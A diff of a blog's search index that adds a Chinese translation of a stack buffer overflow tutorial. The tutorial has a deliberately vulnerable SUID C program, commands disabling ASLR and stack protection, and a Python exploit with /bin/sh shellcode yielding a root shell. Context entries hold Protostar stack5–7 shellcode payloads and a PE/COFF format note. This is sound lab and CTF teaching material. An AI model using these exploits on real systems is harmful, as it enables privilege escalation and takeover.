@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Classic Stack Based Buffer Overflow]]></title>
+    <url>%2F2019%2F01%2F05%2FClassic-Stack-Based-Buffer-Overflow%2F</url>
+    <content type="text"><![CDATA[Posted on May 8, 2015 by sploitfun 前文部分是翻译, 后文译者扩展了部分内容 VM Setup: Ubuntu 12.04 (x86) 这是该系列中最简单的一篇文章，并且，你已经能够在网上找到许多内容相似的文章。尽管如此，我仍然想要在自己博客上也写一篇关于它的文章，因为这将会为我之后要发表的post打下基础。 什么是Buffer Overflow? 在以下情况中,将source buffer复制到destination buffer中可能会产生溢出: 源字符串比目标字符串更长 没有长度检测 栈溢出可分为如下两种类型: Stack Based Buffer Overflow – 目的缓冲区在栈中 Heap Based Buffer Overflow – 目的缓冲区在堆中 Here in this post, I will talk only about stack based buffer overflow. Heap overflows will be discussed in ‘Level 3’ of Linux (x86) Exploit Development Tutorial Series!! 栈溢出漏洞将会导致任意代码执行!! 什么是arbitrary code execution? 任意代码执行允许攻击者执行他想要执行的代码, 以此来获得受害机器的控制权. 攻击者可通过产生一个root shell, 添加一个新用户, 开启一个网络端口等方式来获得主机的控制权. 听起来还蛮有意思的, 让我们通过下面的一段代码来更深入的了解栈溢出! Vulnerable Code: 12345678910//vuln.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123; /* [1] */ char buf[256]; /* [2] */ strcpy(buf,argv[1]); /* [3] */ printf("Input:%s\n",buf); return 0;&#125; Compilation Commands: 12345#echo 0 &gt; /proc/sys/kernel/randomize_va_space //关闭aslr$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //无cannary$sudo chown root vuln //改变权限$sudo chgrp root vuln$sudo chmod +s vuln //设置suid 在上述代码中,Line [2]存在缓冲区溢出漏洞. 这个漏洞可以造成任意代码执行, 因为源缓冲区的内容是由用户输入的. 任意代码执行如何实现? Arbitrary code execution是通过Return Address Overwrite实现的. 通过对返回地址的覆写, 我们可以返回到任意地方. 在看exp之前, 我们先看看反汇编代码和栈布局. Disassembly: 123456789101112131415161718192021222324252627(gdb) disassemble mainDump of assembler code for function main: //Function Prologue 0x08048414 &lt;+0&gt;: push %ebp //backup caller&apos;s ebp 0x08048415 &lt;+1&gt;: mov %esp,%ebp //set callee&apos;s ebp to esp 0x08048417 &lt;+3&gt;: and $0xfffffff0,%esp //stack alignment 0x0804841a &lt;+6&gt;: sub $0x110,%esp //stack space for local variables 0x08048420 &lt;+12&gt;: mov 0xc(%ebp),%eax //eax = argv 0x08048423 &lt;+15&gt;: add $0x4,%eax //eax = &amp;argv[1] 0x08048426 &lt;+18&gt;: mov (%eax),%eax //eax = argv[1] 0x08048428 &lt;+20&gt;: mov %eax,0x4(%esp) //strcpy arg2 0x0804842c &lt;+24&gt;: lea 0x10(%esp),%eax //eax = &apos;buf&apos; 0x08048430 &lt;+28&gt;: mov %eax,(%esp) //strcpy arg1 0x08048433 &lt;+31&gt;: call 0x8048330 &lt;strcpy@plt&gt; //call strcpy 0x08048438 &lt;+36&gt;: mov $0x8048530,%eax //eax = format str &quot;Input:%s\n&quot; 0x0804843d &lt;+41&gt;: lea 0x10(%esp),%edx //edx = buf 0x08048441 &lt;+45&gt;: mov %edx,0x4(%esp) //printf arg2 0x08048445 &lt;+49&gt;: mov %eax,(%esp) //printf arg1 0x08048448 &lt;+52&gt;: call 0x8048320 &lt;printf@plt&gt; //call printf 0x0804844d &lt;+57&gt;: mov $0x0,%eax //return value 0 //Function Epilogue 0x08048452 &lt;+62&gt;: leave //mov ebp, esp; pop ebp; 0x08048453 &lt;+63&gt;: ret //returnEnd of assembler dump.(gdb) Stack Layout: 我们已经知道超过256字节的输入将会导致溢出, 并且可能会覆盖栈中存储的返回地址. 下面让我们测试一下. Test Step 1: Is Return Address Overwrite possible? 1234567891011$ gdb -q vulnReading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.(gdb) r `python -c 'print "A"*300'`Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*300'`Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAProgram received signal SIGSEGV, Segmentation fault.0x41414141 in ?? ()(gdb) p/x $eip$1 = 0x41414141(gdb) 上面的输出表明EIP已经被覆盖为AAAA, 这证实了我们的想法—— 返回地址是可以覆写的. Test Step 2: What is the offset from Destination Buffer? 下面我们需要计算出从返回地址到buf之间需要覆盖多少个字节, 从上面的栈布局图中我们可以看到retaddr到buf的偏移地址是0x10c, 计算过程如下: 0x10c = 0x100 + 0x8 + 0x4 上面 0x100是buf缓冲区的大小 0x8是对齐偏移 0x4是caller’s EBP 因此输入A * 268 + B * 4将会把返回地址改写成BBBB, 其余部分覆盖为AAAA. 1234567891011$ gdb -q vulnReading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.(gdb) r `python -c 'print "A"*268 + "B"*4'`Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*268 + "B"*4'`Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBProgram received signal SIGSEGV, Segmentation fault.0x42424242 in ?? ()(gdb) p/x $eip$1 = 0x42424242(gdb) 上述输出结果表明攻击将返回地址改写成了BBBB. 我们可以根据上述的原理写一个exp来实现任意代码执行. Exploit Code: 12345678910111213141516171819202122232425#exp.py #!/usr/bin/env pythonimport structfrom subprocess import call#Stack address where shellcode is copied.#这里这个地址好像有点问题, 地址应该返回到NOP或者shellcode处, 下面这个地址是在buf之中ret_addr = 0xbffff1d0 #Spawn a shell#execve(/bin/sh)scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"#endianess convertiondef conv(num): return struct.pack("&lt;I",num)# buf = Junk + RA + NOP's + Shellcodebuf = "A" * 268buf += conv(ret_addr)buf += "\x90" * 100buf += scodeprint "Calling vulnerable program"call(["./vuln", buf]) 执行上述的exp, 我们可以得到一个shell: 12345678$ python exp.py Calling vulnerable programInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���# iduid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)# exit$ NOTE: Inorder to get this root shell, we turned off many exploit mitigation techniques. Infact for all the posts in level 1, I have disabled these exploit mitigation techniques, since the objective of level 1, is to introduce you to vulnerabilities. And real fun happens when we get to “Level 2” of Linux (x86) Exploit Development Tutorial Series, where I will talk about bypassing these exploit mitigation techniques!!!]]></content>
+      <categories>
+        <category>Translate</category>
+      </categories>
+      <tags>
+        <tag>stack overflow</tag>
+        <tag>pwn</tag>
+        <tag>exploit series</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Windows PE/COFF]]></title>
     <url>%2F2017%2F12%2F08%2Fwindows-PE-COFF%2F</url>
     <content type="text"><![CDATA[PREFACEWindows下的可执行文件采用PE格式, 而编译器产生的目标文件仍为COFF格式. 由于PE是COFF的一种扩展, 它们在结构上很大程度相同. 很多时候我们可以将它们统称为PE/COFF文件. COFFCOFF文件的文件头部(类比ELF Header)包括两部分, 一个是描述该文件总体结构和属性的映像头(Image Header), 另一个是描述该文件中包含的端属性的段表(Section Table). 下图定性的描述了COFF文件的大致结构. Image Header123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //目标机器类型(CPU类型) WORD NumberOfSections; //段的数量 DWORD TimeDateStamp; //PE文件创建的时间 DWORD PointerToSymbolTable; //符号表在PE文件中的位置 DWORD NumberOfSymbols; //符号数量 WORD SizeOfOptionalHeader; //Optional Header的大小(仅PE) WORD Characteristics; //标志位&#125;IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER Section Table段表是一个类型为_IMAGE_SECTION_HEADER的数组, 数组的大小为COFF文件所包含的段的数量. Section Header12345678910111213141516typedef struct _IMAGE_SECTION_HEADER &#123; BYTE name[IMAGE_SIZEOF_SHORT_NAME]; //节区名称 //IMAGE_SIZEOF_SHORT_NAME=8 union &#123; DWORD PhysicalAddress; //物理地址 DWORD VirtualSize; //内存中节区所占大小 &#125;Misc; DWORD VirtualAddress; //内存中节区起始地址 DOWRD SizeOfRawData; //磁盘文件中节区所占大小 DOWRD PointerToRawData; //磁盘文件中节区起始位置偏移量 DWORD PointerToRelocations; //重定位的偏移 DWORD PointerToLinenumbers; //行号表的偏移 WORD NumberOfRelocations; //重定位项数目 WORD NumberOfLinenumbers; //行号表的数目 DWORD Characteristics; //节区属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; characteristics12345678910111213141516171819#define IMAGE_SCN_TYPE_NO_PAD 0x00000008#define IMAGE_SCN_CNT_CODE 0x00000020 //该段是代码#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 //数据段#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 //bss段#define IMAGE_SCN_LNK_OTHER 0x00000100#define IMAGE_SCN_LNK_INFO 0x00000200 //该段包含的是注释或其他信息#define IMAGE_SCN_LNK_REMOVE 0x00000800 //链接后抛弃...#define IMAGE_SCN_LNK_NRELOC_OVFL 0x01000000#define IMAGE_SCN_MEM_DISCARDABLE 0x02000000#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000#define IMAGE_SCN_MEM_NOT_PAGED 0x08000000#define IMAGE_SCN_MEM_SHARED 0x10000000 //共享段#define IMAGE_SCN_MEM_EXECUTE 0x20000000 //该段在内存中可执行#define IMAGE_SCN_MEM_READ 0x40000000 //该段在内存中是可读的#define IMAGE_SCN_MEM_WRITE 0x80000000 //该段在内存中可写#define IMAGE_SCN_SCALE_INDEX 0x00000001 Other .drectve段— 链接指示信息 .debug段— 调试信息 Symbol Table : 与ELF文件符号表基本相同, 主要有符号名/符号类型/所在位置等信息. PEPE文件是COFF文件的扩展, 相比COFF文件, PE文件多了以下几个结构(并不完整): 最头部添加DOS MZ可执行文件格式的文件头和桩代码 IAMGE_FILE_HEADER 扩展成了IMAGE_NT_HEADER PE文件的大致结构结构如下图: DOS Header &amp; DOS StubDOS Header123456789101112131415161718192021 typedef struct _IMAGE_DOS_HEADER &#123; WORD e_magic; //MZ WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; //指向向程序入口段地址 WORD e_cs; //指向程序入口偏移地址 WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; //PE文件头在文件中的偏移&#125; IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER; DOS Stub这是一段能够在DOS下运行的代码, 这段代码的功能是输出This program cannot be run in DOS mode, 然后退出程序. NT HeaderIMAGE_NT_HEADER是PE真正的文件头, 它包含一个PE签名和两个结构体— IMAGE_FILE_HEADER和IMAGE_OPTIONAL_HEADER. 其中的 IMAGE_FILE_HEADER和COFF文件中的相同. PE签名的值恒为PE\x00\x00. 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; &#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32; Image Optional Header123456789101112131415161718192021222324typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; ////PE32中为10B，PE32+中为20B ... DWORD AddressOfEntryPoint; ////持有EP的RVA值，程序最先执行的代码的地址 DWORD BaseOfCode; DWORD BaseOfData; DWORD ImageBase; //文件的优先装入地址，EXE、DLL到用户内存0～7FFFFFFF //SYS到内核内存80000000~FFFFFFFF //典型地，EXE：00400000；DLL：10000000 DWORD SectionAlignment; //节区在内存中的最小单位 DWORD FileAlignment; //节区在磁盘文件中的最小单位 ... DWORD SizeOfImage; //PE Image在虚拟内存中所占的空间大小 DWORD SizeOfHeaders; //整个PE头的大小，必须是FileAlignment的整数倍 DWORD CheckSum; //区分系统驱动文件*.sys与普通可执行文件*.exe, *.dll WORD Subsystem; ... DWORD NumberOfRvaAndSizes; //到此处总共有0x60个字节 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; /*特别注意： DataDirectory[0]=EXPORT Directory DataDirectory[1]=IMPORT Directory */&#125; IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32; Data Dtirectory 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY; 123456789101112131415#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 //导出表#define IMAGE_DIRECTORY_ENTRY_IMPORT 1 //导入表#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 //资源表#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 //异常表#define IMAGE_DIRECTORY_ENTRY_SECURITY 4#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5#define IMAGE_DIRECTORY_ENTRY_DEBUG 6 //调试信息表#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8#define IMAGE_DIRECTORY_ENTRY_TLS 9 //线程私有存储#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11#define IMAGE_DIRECTORY_ENTRY_IAT 12 //导入地址表#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 REFRENCE 《程序员的自我修养— 链接、装载与库》]]></content>
@@ -47,10 +60,10 @@
         <category>write-up</category>
       </categories>
       <tags>
+        <tag>stack overflow</tag>
         <tag>pwn</tag>
         <tag>CTF</tag>
         <tag>pwnable.tw</tag>
-        <tag>stack overflow</tag>
       </tags>
   </entry>
   <entry>
@@ -73,10 +86,10 @@
         <category>write-up</category>
       </categories>
       <tags>
+        <tag>stack overflow</tag>
         <tag>pwn</tag>
         <tag>CTF</tag>
         <tag>pwnable.tw</tag>
-        <tag>stack overflow</tag>
       </tags>
   </entry>
   <entry>
@@ -87,8 +100,8 @@
         <category>write-up</category>
       </categories>
       <tags>
-        <tag>shellcode</tag>
         <tag>pwn</tag>
+        <tag>shellcode</tag>
         <tag>CTF</tag>
         <tag>pwnable.tw</tag>
       </tags>
@@ -110,8 +123,8 @@
     <url>%2F2017%2F09%2F08%2Fprotostar-stack-still-easy%2F</url>
     <content type="text"><![CDATA[接上次protostar stack easy, 这篇文章是stack5-stack7的write-up, 因为给汇编代码写注释太费时间, 我就直接上源码了. stack5将shellcode写到栈上, 然后JMP到shellcode的起始地址. ‘0x90’是NOP指令的机器码, 加入适当的’0x90’是提高JMP进shellcode的几率, 在这个题目中加或不加都没有关系, 因为没有开启ASLR. 这种技巧在heap spray中也会用到. exp123456789sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'payroad = ''payroad += 'A' * 0x4cpayroad += '\xb0\xfc\xff\xbf'#payroad += '\x90' * 0x20payroad += scprint payroad stack6先看源码中的这几句 :123456ret = __builtin_return_address(0);if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1);&#125; __builtin_return_address函数返回当前函数或调用当前函数的指令的返回地址. 参数为0表示返回当前函数的地址. if语句限制了返回地址第一个字节不能等于0xbf, 也就是说, 返回地址不能在栈上.12345678910(gdb) info proc mappingsprocess 4407cmdline = &apos;/opt/protostar/bin/stack6&apos;cwd = &apos;/opt/protostar/bin&apos;exe = &apos;/opt/protostar/bin/stack6&apos;Mapped address spaces: Start Addr End Addr Size Offset objfile ... ... 0xbffeb000 0xc0000000 0x15000 0 [stack] exp这道题目可以用ret2libc做, 但是这里我们用另外一种方法.1234567891011sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'retaddr = '\xf9\x84\x04\x08' # retpayroad = ''payroad += 'A' * 0x50payroad += retaddrpayroad += '\x94\xfc\xff\xbf'#payroad += '\x90' * 0x20payroad += scprint payroad 这里我们通过ret两次来绕过检查, 第一次返回到ret指令, 第二次返回到shellcode首地址. stack7先看源码:123456789ret = __builtin_return_address(0); if((ret &amp; 0xb0000000) == 0xb0000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1); &#125; printf("got path %s\n", buffer); return strdup(buffer); 参照stack6, 前两句限制了ret2libc和直接JMP shellcode. 我们仍然可以用返回到.text段的方法. 这里有一点很奇怪, 当我在gdb里面调试的时候是能够成功getshell的, 但是直接执行程序的时候会报错Illegal instruction.这里可能的原因是gdb中调试的地址和实际运行的地址不同.具体参照Here, 可以通过生成core文件来查看地址.这道题特殊的解法是JMP register, 因为strdup返回的地址被保存在eax中, 我们也可以利用这一点来JMP到shellcode, 具体实现见Here.]]></content>
       <tags>
-        <tag>pwn</tag>
         <tag>stack overflow</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -122,8 +135,8 @@
         <category>RE note</category>
       </categories>
       <tags>
-        <tag>shellcode</tag>
         <tag>pwn</tag>
+        <tag>shellcode</tag>
         <tag>gdb</tag>
       </tags>
   </entry>
@@ -135,8 +148,8 @@
         <category>write-up</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>stack overflow</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
